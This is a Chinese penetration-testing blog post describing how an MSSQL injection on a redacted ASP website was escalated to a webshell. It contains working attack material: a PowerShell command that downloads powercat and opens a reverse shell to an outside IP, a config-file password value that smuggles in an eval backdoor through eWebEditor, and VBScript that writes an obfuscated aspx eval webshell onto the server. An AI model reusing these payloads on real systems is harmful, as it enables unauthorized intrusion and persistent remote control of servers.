---
title: 从注入到webshell
date: 2019-01-06 02:59:27
tags:
---

>背景：一朋友渗透测试中遇到一个注入点可执行命令，但无法突破写shell卡住,**mssql**注入**dba**权限**whoami**为**network**权限木马暂时未上

注入点: `https://********.com/member/news.asp?ID=6666`

### 判断是否站库分离 ###
```sql
select @@servername`
select host_name()`
```
发现站库是同服务器

![2019-07-30-05-03-10](https://wolvez.oss-cn-hangzhou.aliyuncs.com/87f95d1b0395eb09b9d6dae8a3d1c799.png)

直接sqlshell执行命令返回太慢，且容易产生大量不必要日志，web目录不可写，所以这里使用powershell反弹shell

```powershell
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c 123.123.123.123 -p 443 -e cmd
```
![2019-07-30-05-22-18](https://wolvez.oss-cn-hangzhou.aliyuncs.com/fa0d3207b6d655871c7072fa68b27f0d.png)

web目录不可写
![2019-07-30-06-24-51](https://wolvez.oss-cn-hangzhou.aliyuncs.com/669c6f379359eccb94d33e5f81bb8218.png)

发现有php进程，看php进程是否以system权限启动，如果为system权限启动并且对应的web目录可写，就直接省去了提权
`tasklist /fi "IMAGENAME eq php.exe" /v`
执行发现并不是高权限启动

发现eweb编辑器，且配置文件插入了常用iis可解析后缀
![2019-07-30-05-17-51](https://wolvez.oss-cn-hangzhou.aliyuncs.com/1a8a9527e98abd55d7e51ce3c700dcd3.png)

登录eweb编辑器发现没有开启asp上传相关组件，无法使用eweb编辑器进行上传任何文件，但是可以**修改配置文件**，也就是说并不是真正的不可写，修改配置文件调用的是`Adodb.Stream`，而通常上传代码为`Scripting.FileSystemObject` 组件
![2019-07-30-06-23-01](https://wolvez.oss-cn-hangzhou.aliyuncs.com/c6b742eef477112b137db0d1d2b43db8.png)
![2019-07-30-05-26-44](https://wolvez.oss-cn-hangzhou.aliyuncs.com/4ceb6c9c1cd81b7aa16739b50ff3c868.png)

查看`ewebeditor/admin/private.asp`

![2019-07-30-06-16-39](https://wolvez.oss-cn-hangzhou.aliyuncs.com/1b92b362fb8b7daccf6fd9c4ba0d22be.png)

拿shell思路写config.asp配置文件
**修改写配置文件**
将密码修改为:
`aaaaaaaaa":eval request("a")'`
**aaaaaaaaa**为原本密码
成功连接webshell
`https://********.com/ewebeditor/asp/config.asp`

![2019-07-30-06-20-52](https://wolvez.oss-cn-hangzhou.aliyuncs.com/c4474d311ce034824c948d316a5c4b5b.png)


既然Adodb.Stream 可以修改配置文件，那么同样也可以用来上传文件，下图是eweb中写配置文件代码，我们可以直接抠出来用

![2019-07-30-06-35-07](https://wolvez.oss-cn-hangzhou.aliyuncs.com/b454668b6fbb582f4a442fd903b52a40.png)


>菜刀执行自定义代码
![2019-07-30-06-46-31](https://wolvez.oss-cn-hangzhou.aliyuncs.com/d296bb33a190c6d775637d5108979f42.png)

利用Adodb.Stream 写aspxshell
```vbs
Sub WriteFile(s_FileName, s_Text)
	On Error Resume Next
	Err.Clear
	Dim stm
	Set stm = Server.CreateObject("Adodb.Stream")
	stm.Type = 2
	stm.mode = 3
	stm.charset = "utf-8"
	stm.Open
	stm.WriteText s_Text
	stm.SaveToFile Server.Mappath(s_FileName), 2
	stm.flush
	stm.Close
	Set stm = Nothing

	If Err.Number<>0 Then
		Err.Clear
		Response.Write "<br><br>Error: Write config file, reason:<br>1. You do not have write privileges for eWebEditor/asp/config.asp<br>2. Server have disabled Adodb.Stream Object"
		Response.End
	End If	
End Sub
aspxshell= "<"&"%"&"@"&"Page Language"&"="&""""&"Jscript"&""""&"%"&">"&"<"&"%"&"eval"&"("&"Request"&"."&"Item"&"["&""""&"pass"&""""&"]"&","&""""&"unsafe"&""""&")"&";"&"%"&">"
Call WriteFile("../uploadfile/config.aspx", aspxshell)
```
成功获得aspxshell：
`https://********.com/ewebeditor/asp/config.aspx` `pass`

这里为什么要用aspx shell呢？因为`.net`有可能继承users组权限，且不受`fso`(FileSystemObject)组件影响,当然也可以使用**无fsoshell**



数据库反弹shell无法对web目录写文件原因下几个图片可以说明：
![2019-07-30-06-45-23](https://wolvez.oss-cn-hangzhou.aliyuncs.com/c9fd7a7adea2782bb6801de9e590428b.png)

数据库shell权限：
![2019-07-30-06-38-05](https://wolvez.oss-cn-hangzhou.aliyuncs.com/387cd9e0c565d0b74bc611d16133cb5b.png)

webshell 下权限
![2019-07-30-06-44-09](https://wolvez.oss-cn-hangzhou.aliyuncs.com/f2f953c2079630b0ee221b8c58b8bf5a.png)

